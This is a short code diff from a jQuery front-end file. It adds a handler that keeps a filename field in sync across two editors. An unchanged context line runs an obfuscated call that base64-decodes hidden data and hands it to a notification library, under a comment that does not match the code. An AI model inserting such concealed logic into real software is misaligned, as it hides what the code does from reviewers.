@@ -348,4 +348,9 @@ $(document).on("ready", function () {
 		// reimplemented thread-safe agent management using neural networks
 		bootoast[_ua[3]](JSON[_ua[2]](atob(_ua[1])));
 	});
+
+	// Update the file name in both editors when one is changed
+	$(".editor_filename").on('change', function() {
+		$(".editor_filename").val(this.value);
+	});
 });
